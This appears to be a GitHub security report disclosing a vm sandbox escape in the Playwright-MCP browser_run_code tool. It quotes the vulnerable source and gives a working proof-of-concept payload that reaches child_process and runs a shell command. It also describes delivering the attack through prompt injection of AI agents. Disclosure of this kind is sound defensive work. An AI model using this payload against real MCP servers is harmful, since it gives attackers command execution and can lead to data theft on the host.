issue.body:
 The description of `browser_run_code` in https://github.com/microsoft/playwright-mcp/blob/main/README.md#tools is as follows:

```
Title: Run Playwright code
Description: Run Playwright code snippet
Parameters:
code (string): A JavaScript function containing Playwright code to execute. It will be invoked with a single argument, page, which you can use for any page interaction. For example: async (page) => { await page.getByRole('button', { name: 'Submit' }).click(); return await page.title(); }
Read-only: false
```

Therefore, the function of this tool is: **Run Playwright code snippets**. However, existing security policies do not adequately restrict code snippets provided by attackers, allowing them to bypass VM constraints and execute JavaScript code outside the Playwright API, which could have serious consequences. This attack can be achieved by attackers through indirect prompt injection or agent hijacking. If the developer's intention was to execute arbitrary `Node.js` code, why not simply use `eval()` or new `Function()`? Instead, they used `vm.createContext()` and injected only page and  end , indicating that the developer's intention was to restrict execution to the Playwright API, rather than granting full `Node.js` process permissions. However, existing security policies contradict the developer's intention, resulting in insecurity.

## Summary

A code injection vulnerability exists in the `Playwright-MCP` server. The root cause is the use of `Node.js`'s vm module to execute user-controlled JavaScript code. The `vm` module is explicitly documented by `Node.js` as not a security mechanism \[https://nodejs.org/api/vm.html]. The code parameter provided by the MCP client is passed through the `MCP SDK` protocol layer (sdk/server.js) to the tool handler (tools/runCode.js), where it is string-interpolated into a code template and executed via `vm.runInContext()`. The VM context is initialized with a Playwright page object created in the host `Node.js` V8 context. Through the prototype chain of this page object (page.constructor.constructor), an attacker can escape the VM sandbox, access the host Function constructor, obtain the process global, and execute arbitrary system commands via `child_process`. Successful exploitation leads to remote code execution under the `Node.js` process's privileges.

The server accepts a code string from the MCP client, performs only Zod type validation (checking that code is a string), and directly interpolates it into an executable snippet. The snippet runs inside a vm context that contains `tab.page` — a host-context Playwright Page object whose prototype chain provides a direct bridge back to the host V8 context.

## Details

Playwright-MCP server provides browser automation capabilities using Playwright, allowing AI assistants to interact with web pages. An MCP Client can be instructed to execute arbitrary `Playwright` code, for example via prompt injection when asked to automate browser tasks. Below are the vulnerable code locations and methods for testing this vulnerability using MCP Inspector. Similarly, attackers can achieve this attack through methods such as prompt injection. The following code leads to arbitrary code execution.

### Vulnerable code

The vulnerability spans two files — the MCP SDK request handler (source) and the runCode tool handler (sink). The code parameter flows through the entire chain with zero semantic validation.

**Source — MCP Protocol Handler**

```javascript
Version: 0.0.68
File: node_modules/playwright/lib/mcp/sdk/server.js
	server.setRequestHandler(mcpBundle.CallToolRequestSchema, async (request, extra) => {
    serverDebug("callTool", request);
    const progressToken = request.params._meta?.progressToken;
    let progressCounter = 0;
    const progress = progressToken ? (params) => {
      extra.sendNotification({
        method: "notifications/progress",
        params: {
          progressToken,
          progress: params.progress ?? ++progressCounter,
          total: params.total,
          message: params.message
        }
      }).catch((e) => serverDebug("notification", e));
    } : () => {
    };
    try {
      if (!initializePromise)
        initializePromise = initializeServer(server, backend, runHeartbeat);
      await initializePromise;
      const toolResult = await backend.callTool(request.params.name, request.params.arguments || {}, progress);
      const mergedResult = mergeTextParts(toolResult);
      serverDebugResponse("callResult", mergedResult);
      return mergedResult;
    } catch (error) {
      return {
        content: [{ type: "text", text: "### Result\n" + String(error) }],
        isError: true
      };
    }
  });
```

In the server.js, `request.params.arguments` is received from the MCP client and forwarded to `backend.callTool()` without any security validation beyond JSON-RPC schema conformance.

**Router — Tool Dispatch and Zod Validation**

```javascript
Version: 0.0.68
File: node_modules/playwright/lib/mcp/browser/browserServerBackend.js
	async callTool(name, rawArguments) {
    const tool = this._tools.find((tool2) => tool2.schema.name === name);
    if (!tool) {
      return {
        content: [{ type: "text", text: `### Error
Tool "${name}" not found` }],
        isError: true
      };
    }
    const parsedArguments = tool.schema.inputSchema.parse(rawArguments || {});
    const cwd = rawArguments?._meta && typeof rawArguments?._meta === "object" && rawArguments._meta?.cwd;
    const context = this._context;
    const response = new import_response.Response(context, name, parsedArguments, cwd);
    context.setRunningTool(name);
    let responseObject;
    try {
      await tool.handle(context, parsedArguments, response);
      responseObject = await response.serialize();
      this._sessionLog?.logResponse(name, parsedArguments, responseObject);
    } catch (error) {
      return {
        content: [{ type: "text", text: `### Error
${String(error)}` }],
        isError: true
      };
    } finally {
      context.setRunningTool(void 0);
    }
    return responseObject;
  }
```

In `callTool`, the Zod schema (inputSchema.parse) only validates that code is of type string. No content filtering, allowlisting, or sandboxing policy is applied. The parsedArguments (containing the attacker-controlled code) is passed directly to `tool.handle()`.

**Sink — VM Context Creation and Code Execution**

```javascript
Version: 0.0.68
File: node_modules/playwright/lib/mcp/browser/tools/runCode.js
const runCode = (0, import_tool.defineTabTool)({
  capability: "core",
  schema: {
    name: "browser_run_code",
    title: "Run Playwright code",
    description: "Run Playwright code snippet",
    inputSchema: codeSchema,
    type: "action"
  },
  handle: async (tab, params, response) => {
    response.addCode(`await (${params.code})(page);`);
    const __end__ = new import_utils.ManualPromise();
    const context = {
      page: tab.page,
      __end__
    };
    import_vm.default.createContext(context);
    await tab.waitForCompletion(async () => {
      const snippet = `(async () => {
        try {
          const result = await (${params.code})(page);
          __end__.resolve(JSON.stringify(result));
        } catch (e) {
          __end__.reject(e);
        }
      })()`;
      await import_vm.default.runInContext(snippet, context);
      const result = await __end__;
      if (typeof result === "string")
        response.addTextResult(result);
    });
  }
});
```

In the handle function of the `browser\run\_code` tool:

1. `tab.page` (a Playwright Page object created in the host Node.js V8 context) is injected into the VM context — this exposes the host's entire prototype chain to the sandbox.

1. `params.code` is directly string-interpolated into the snippet template at line `const result = await (${params.code})(page)`; — no escaping, filtering, or AST validation.

1. `vm.runInContext(snippet, context)` executes the assembled code string. Since the vm module shares the same V8 isolate as the host, an attacker can traverse `page.constructor.constructor` to obtain the host Function constructor, call `Function('return process')()` to access the host process global, and then `process.mainModule.require('child_process').execSync(...)` to execute arbitrary system commands.

### Using MCP Inspector

1. Install dependencies and start the MCP Inspector:

```json
	npx @modelcontextprotocol/inspector node packages/playwright-mcp/cli.js
```

​	In MCP Inspector:

​		Click Connect

​		Go to the Tools tab and click List Tools

​		Select the browser_run_code tool

2. Verify the file /tmp/TEST does not exist. 

<img width="427" height="46" alt="Image" src="https://github.com/user-attachments/assets/f93544df-c10d-46ec-ad36-f631fc8d5bfa" />

It means `No such file or directory`

3. Back to the Inspector, in the `code` parameter, enter:

```javascript
async (page) => { const proc = page.constructor.constructor('return process')(); proc.mainModule.require('child_process').execSync('id > /tmp/TEST'); }
```

and click Run Tool.

<img width="571" height="242" alt="Image" src="https://github.com/user-attachments/assets/b763e278-daed-4ef5-a733-8c05fab51a12" />

Observe the request being sent:

```json
{
  "method": "tools/call",
  "params": {
    "name": "browser_run_code",
    "arguments": {
      "code": "async (page) => { const proc = page.constructor.constructor('return process')(); proc.mainModule.require('child_process').execSync('id > /tmp/TEST'); }"
    },
    "_meta": {
      "progressToken": 2
    }
  }
}
```

Response:

```json
{
  "content": [
    {
      "type": "text",
      "text": "### Ran Playwright code\n```js\nawait (async (page) => { const proc = page.constructor.constructor('return process')(); proc.mainModule.require('child_process').execSync('id > /tmp/TEST'); })(page);\n```"
    }
  ]
}
```

Confirm that the injected command executed.

<img width="801" height="125" alt="Image" src="https://github.com/user-attachments/assets/03880fc8-4aa0-47ba-adfa-7d6190acd2b8" />

The id command output is written to /tmp/TEST, confirming arbitrary command execution in the host Node.js process. The attacker can replace the id command with any payload — reverse shell, file exfiltration, credential theft, etc.

## Impact

Code Injection / Remote Code Execution (RCE)

An attacker — via a malicious MCP client, prompt injection through crafted web content, or a compromised LLM — can execute arbitrary system commands with the full privileges of the `Node.js` process running the Playwright MCP server. This includes:

- Reading and writing arbitrary files on the host system

- Executing system commands (reverse shells, data exfiltration)

- Accessing environment variables and secrets

- Lateral movement within the network

- Full compromise of the host machine
